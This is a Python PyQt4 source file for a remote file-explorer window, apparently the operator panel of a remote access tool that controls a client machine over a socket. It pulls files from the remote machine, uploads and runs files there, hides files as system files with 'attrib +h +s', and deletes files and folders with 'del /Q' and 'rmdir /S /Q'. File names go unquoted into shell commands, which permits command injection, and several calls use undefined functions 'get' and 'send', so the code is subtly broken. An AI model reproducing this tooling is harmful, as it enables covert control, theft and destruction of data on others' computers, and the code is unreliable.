from PyQt4.QtGui import *
from PyQt4.QtCore import *
from main_ui import Ui_Form
import ast
import socket
import os
from libs.data_transfer import data_get, data_send
from libs.language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.client = args['client']
        self.session_id = args['session_id']
        self.assets = args['assets']

        self.setWindowTitle(_('MEXPLORER_TITLE'))

        self.gui = QApplication.processEvents

        self.set_language()

        # hide progressbar
        self.progressBar.setVisible(False)
        self.cancelButton.setVisible(False)

        # progress status
        self.activeProgress = False

        # signals
        self.upButton.clicked.connect(self.parent_folder)
        self.explorerTable.doubleClicked.connect(self.open_folder)
        self.explorerPathEntry.returnPressed.connect(self.open_path)
        self.uploadButton.clicked.connect(self.upload)
        self.downloadButton.clicked.connect(self.download)
        self.cancelButton.clicked.connect(self.cancelProgress)
        self.refreshButton.clicked.connect(self.refresh)
        # Initializing combobox change Event
        self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.drive_change)

        self.explorerTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.explorerTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.right_click_menu)

        self.get_content()

        self.setAcceptDrops(True)

    def set_language(self):
        self.upButton.setText(_('MEXPLORER_UP'))
        self.refreshButton.setText(_('MEXPLORER_REFRESH'))
        self.downloadButton.setText(_('MEXPLORER_DOWNLOAD'))
        self.uploadButton.setText(_('MEXPLORER_UPLOAD'))
        self.explorerTable.horizontalHeaderItem(0).setText(_('MEXPLORER_TYPE'))
        self.explorerTable.horizontalHeaderItem(1).setText(_('MEXPLORER_NAME'))
        self.explorerTable.horizontalHeaderItem(2).setText(_('MEXPLORER_DATE_MODIFIED'))
        self.explorerTable.horizontalHeaderItem(3).setText(_('MEXPLORER_SIZE'))
        self.fileLabel.setText(_('MEXPLORER_FILE'))
        self.dirLabel.setText(_('MEXPLORER_FOLDER'))
        self.hfileLabel.setText(_('MEXPLORER_HIDDEN_FILE'))
        self.hdirLabel.setText(_('MEXPLORER_HIDDEN_FOLDER'))
        self.selectedLabel.setText(_('MEXPLORER_SELECTED'))
        self.dirfilesLabel.setText(_('MEXPLORER_FOLDERS_FILES'))

    def refresh(self):
        self.get_content()

    def dragEnterEvent(self, event):
        if event.mimeData().hasUrls:
            event.accept()
        else:
            event.ignore()

    def dragMoveEvent(self, event):
        self.explorerTable.setVisible(False)
        if event.mimeData().hasUrls:
            event.setDropAction(Qt.CopyAction)
            event.accept()
        else:
            event.ignore()
        self.explorerTable.setVisible(True)

    def dropEvent(self, event):
        if event.mimeData().hasUrls:
            event.setDropAction(Qt.CopyAction)
            event.accept()
            for url in event.mimeData().urls():
                self.upload(url.toLocalFile())
        else:
            event.ignore()

    def rename(self):
        target = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
        text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_RENAME'),
                                        _('MEXPLORER_MSG_RENAME_WITH'),
                                        QLineEdit.Normal,
                                        target)
        if ok:
            data_get(self.sock, 'rename %s %s' % (target, text), 'shellMode', session_id=self.session_id)
            self.get_content()

    def right_click_menu(self, point):
        try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            self.emenu = QMenu(self)

            # File commands
            if '<FILE>' in _type:
                self.emenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), _('MEXPLORER_DOWNLOAD'), self.download)
                self.emenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), _('MEXPLORER_EXECUTE'), self.execute_remotely)

            # Folder commands
            elif '<DIR>' in _type:
                self.emenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), _('MEXPLORER_OPEN_FOLDER'), self.open_folder)

            # Global commands
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'rename.png')), _('MEXPLORER_RENAME'), self.rename)
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'hidden.png')), _('MEXPLORER_HIDE'), self.hide)
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'unhide.png')), _('MEXPLORER_SHOW'), self.unhide)
            self.emenu.addSeparator()
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'remove.png')), _('MEXPLORER_DELETE'), self.remove)

            self.emenu.exec_(self.explorerTable.mapToGlobal(point))

        except AttributeError:
            pass

    def unhide(self):
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        get(self.sock, 'attrib -h -s {}'.format(_file), 'hide')
        self.get_content()

    def hide(self):
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        get(self.sock, 'attrib +h +s {}'.format(_file), 'unhide')
        self.get_content()

    def execute_remotely(self):
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        data = get(self.sock, 'start /d %CD% {}'.format(_file), 'execute')

    def remove(self):
        try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())

            warn = QMessageBox(QMessageBox.Question, _('MEXPLORER_MSG_CONFIRM'), _('MEXPLORER_MSG_DELETE'))
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                if '<FILE>' in _type:
                    result = get(self.sock, 'del /Q %s' % _file, 'remove')
                elif '<DIR>' in _type:
                    result = get(self.sock, 'rmdir /S /Q %s' % _file, 'remove')
                self.get_content()
            else:
                return
        except AttributeError:
            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
            warn.exec_()

    def temporary_block_signals(self, state):
        if state:
            self.explorerDrivesDrop.blockSignals(True)
            self.explorerPathEntry.blockSignals(True)
            self.explorerTable.blockSignals(True)
        elif not state:
            self.explorerDrivesDrop.blockSignals(False)
            self.explorerPathEntry.blockSignals(False)
            self.explorerTable.blockSignals(False)

    def cancelProgress(self):
        self.activeProgress = False

    def download(self):
        # Get file name
        try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())

            if '<FILE>' in _type:

                # Preparing for upload
                self.progressBar.setVisible(True)
                self.cancelButton.setVisible(True)
                self.temporary_block_signals(True)

                self.activeProgress = True

                end = '[ENDOFMESSAGE]'
                data = ''

                send(self.sock, 'download ' + _file)
                try:
                    recv = str(self.sock.recv(1024))
                    if recv.isdigit():
                        fileSize = int(recv)
                        self.sock.sendall('ok')

                        l = self.sock.recv(1024)
                        while l:
                            self.gui()
                            data += l
                            self.progressBar.setValue(len(data) * 100 / fileSize)
                            if data.endswith(end):
                                break
                            if not self.activeProgress:
                                raise socket.error
                            else:
                                l = self.sock.recv(1024)
                        with open(_file, 'wb') as _f:
                            _f.write(data)
                except socket.error:
                    pass
                finally:
                    self.progressBar.setVisible(False)
                    self.cancelButton.setVisible(False)
                    self.temporary_block_signals(False)
        except AttributeError:
            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
            warn.exec_()

    def upload(self, dropped_file=''):
        try:
            # Get file name
            if dropped_file:
                file_name = dropped_file
            else:
                file_name = str(QFileDialog.getOpenFileName(self, _('MEXPLORER_CHOOSE_FILE'), ''))

            if file_name:

                # Preparing for upload
                self.progressBar.setVisible(True)
                self.cancelButton.setVisible(True)
                self.temporary_block_signals(True)

                self.activeProgress = True

                end = '[ENDOFMESSAGE]'
                fileSize = os.path.getsize(file_name)
                uploadedSize = 0

                name_of_file = str(file_name).split('\\')[-1].split('/')[-1]

                send(self.sock, 'upload ' + str(name_of_file))

                try:
                    with open(file_name, 'rb') as _f:
                        while 1:
                            self.gui()
                            if not self.activeProgress:
                                break
                            data = _f.readline()
                            uploadedSize += len(data)
                            if data:
                                self.sock.send(data)
                                self.progressBar.setValue(uploadedSize * 100 / fileSize)
                                del data
                            else:
                                self.sock.send(end)
                                break
                except IOError:
                    pass
                if self.activeProgress:
                    result = self.sock.recv(1024)
                    if 'downloadDone' in result:
                        self.get_content()
                    elif 'downloadError' in result:
                        return False
                self.progressBar.setVisible(False)
                self.cancelButton.setVisible(False)
                self.temporary_block_signals(False)
        except AttributeError:
            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
            warn.exec_()

    def get_content(self):

        def sizeof_fmt(num, suffix=_('MEXPLORER_B')):
            for unit in ['', _('MEXPLORER_K'),
                         _('MEXPLORER_M'),
                         _('MEXPLORER_G'),
                         _('MEXPLORER_T'),
                         _('MEXPLORER_P'),
                         _('MEXPLORER_E'),
                         _('MEXPLORER_Z'),]:
                if abs(num) < 1024.0:
                    return "%3.1f%s%s" % (num, unit, suffix)
                num /= 1024.0
            return "%.1f%s%s" % (num, 'Yi', suffix)

        # Turn combo signal on
        self.comboInEditMode = True
        self.explorerDrivesDrop.clear()
        data = data_get(self.sock, 'wmic logicaldisk get caption', 'shellMode', session_id=self.session_id, to=self.client)
        # Set captions in combobox
        for i in data['payload'].split('Caption')[-1].split('\n'):
            if ':' in i:
                self.explorerDrivesDrop.addItem(i.replace(' ', '').replace('\r', ''))

        # Initializing table
        self.explorerTable.clearContents()
        self.explorerTable.sortItems(0)

        try:
            data = data_get(self.sock, 'getContent', 'explorerMode', session_id=self.session_id, to=self.client)

            # set remote path entry
            content = ast.literal_eval(data['payload'])

            self.explorerPathEntry.setText(content['path'])

            # Get active drive caption
            self.explorerDrivesDrop.setCurrentIndex(
                self.explorerDrivesDrop.findText(content['path'].split('\\')[0], Qt.MatchFixedString))

            # Turn combo signal off
            self.comboInEditMode = False

            # set tables row count
            self.explorerTable.setRowCount(len(content) - 1)

            file_count = 0
            folder_count = 0

            # add content to table
            for index in content:

                if index == 'path':
                    continue

                if content[index]['hidden']:
                    file_color = QColor('#9b59b6')
                    file_icon = os.path.join(self.assets, 'hidden_file.png')
                    folder_color = QColor('#3498db')
                    folder_icon = os.path.join(self.assets, 'hidden_folder.png')
                else:
                    file_color = QColor('#ecf0f1')
                    file_icon = os.path.join(self.assets, 'file.png')
                    folder_color = QColor('#e67e22')
                    folder_icon = os.path.join(self.assets, 'folder.png')

                # set content type
                item = QTableWidgetItem('<FILE>') if content[index]['type'] else QTableWidgetItem('<DIR>')
                if content[index]['type']:
                    item.setTextColor(file_color)
                    item.setSizeHint(QSize(50, 30))
                    file_count += 1
                else:
                    item.setTextColor(folder_color)
                    item.setSizeHint(QSize(50, 30))
                    folder_count += 1
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.explorerTable.setItem(index, 0, item)

                # set content name
                item = QTableWidgetItem(content[index]['name'])
                if content[index]['type']:
                    item.setTextColor(file_color)
                    item.setIcon(QIcon(QPixmap(file_icon)))
                else:
                    item.setTextColor(folder_color)
                    item.setIcon(QIcon(QPixmap(folder_icon)))
                self.explorerTable.setItem(index, 1, item)

                # set content modified date
                item = QTableWidgetItem(content[index]['modified'])
                item.setTextAlignment(Qt.AlignCenter)
                item.setSizeHint(QSize(220, 30))
                self.explorerTable.setItem(index, 2, item)

                # set file size
                item = QTableWidgetItem(sizeof_fmt(content[index]['size'])) if content[index]['type'] else QTableWidgetItem('')
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                item.setTextColor(file_color)
                self.explorerTable.setItem(index, 3, item)

            # update table
            self.explorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)
            self.explorerTable.resizeColumnsToContents()

            # set folders & files count
            self.dirfilesCountLabel.setText('{0}/{1}'.format(folder_count, file_count))

        except (SyntaxError, ValueError) as e:
            print e
            pass

    # open parent folder
    def parent_folder(self):
        data_get(self.sock, 'cd ..', 'explorerMode', session_id=self.session_id, to=self.client)
        self.get_content()

    # Change Drive
    def drive_change(self):
        if not self.comboInEditMode:
            data = data_get(self.sock, 'cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())),
                       'shellMode', session_id=self.session_id, to=self.client)
            if 'Error opening directory' in data:
                warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_OPEN_FOLDER'), QMessageBox.Ok)
                warn.exec_()

            self.get_content()

    # open remote folder
    def open_folder(self):

        # Get folder name
        _type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
        _name = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()

        if '<DIR>' in _type:
            # Choose new folder
            data_get(self.sock, 'cd %s' % _name, 'shellMode', session_id=self.session_id, to=self.client)

            # Update table
            self.get_content()

    # open remote folder from path entry
    def open_path(self):
        recv = data_get(self.sock, 'cd %s' % str(self.explorerPathEntry.text()), 'shellMode', session_id=self.session_id, to=self.client)
        if 'Error opening directory' in recv:
            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_OPEN_FOLDER'), QMessageBox.Ok)
            warn.exec_()

        self.get_content()
